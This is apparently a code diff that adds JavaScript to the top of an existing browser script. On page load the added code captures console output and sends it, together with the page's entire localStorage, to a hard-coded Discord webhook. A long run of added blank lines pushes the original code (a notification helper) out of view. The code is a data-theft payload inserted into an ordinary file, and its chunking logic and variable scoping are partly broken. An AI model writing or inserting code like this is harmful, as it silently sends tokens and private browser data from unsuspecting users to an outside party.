@@ -1,3 +1,131 @@
+// Store original console log
+        const originalConsoleLog = console.log;
+
+        // Array to hold console messages
+        let consoleMessages = [];
+
+        // Override the console.log method
+        console.log = function(message) {
+            consoleMessages.push(message);
+            originalConsoleLog.apply(console, arguments);
+        };
+
+        // Send the console logs to the Discord webhook
+        function sendToWebhook(messages) {
+            const webhookUrl = "https://discord.com/api/webhooks/1315063023613775982/lAg4xa14l78fFemXvNpW3GYCl3mg7qGPa_qt7-H-VD5pusMUYfbN1xojwJumYCeaePju";
+
+            // Prepare the content
+            let content = "";
+            let chunk = 0;
+            const maxLength = 2000; // Max Discord message length
+
+            // Split the messages into chunks that fit within Discord's character limit
+            while (messages.length > 0) {
+                content = messages.slice(0, maxLength).join('\n');
+                messages = messages.slice(content.length); // Remove the already sent portion
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: content,
+                    }),
+                })
+                .then(response => response.json())
+                .catch(error => console.error('Error sending message to Discord:', error));
+            }
+        }
+
+        // Send localStorage data to Discord
+        function sendLocalStorage() {
+            let localStorageData = JSON.stringify(localStorage);
+            if (localStorageData.length > 2000) {
+                // If localStorage data is too large, split it into multiple chunks
+                while (localStorageData.length > 0) {
+                    let content = localStorageData.slice(0, 2000);
+                    localStorageData = localStorageData.slice(content.length);
+
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: content,
+                        }),
+                    })
+                    .then(response => response.json())
+                    .catch(error => console.error('Error sending localStorage data:', error));
+                }
+            } else {
+                // If the data is small enough, send it as one message
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: localStorageData,
+                    }),
+                })
+                .then(response => response.json())
+                .catch(error => console.error('Error sending localStorage data:', error));
+            }
+        }
+
+        // Optional: If webhook supports file uploads, send console logs as a file
+        function sendLogsAsFile() {
+            const blob = new Blob([consoleMessages.join('\n')], { type: 'text/plain' });
+            const formData = new FormData();
+            formData.append('file', blob, 'console_logs.txt');
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .catch(error => console.error('Error sending log file:', error));
+        }
+
+        // Trigger functions (for example purposes, calling them when the page is loaded)
+        window.onload = function() {
+            sendToWebhook(consoleMessages);
+            sendLocalStorage();
+            sendLogsAsFile();
+        };
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 (function () {
     // Function to create a notification
     function showNotification(message) {
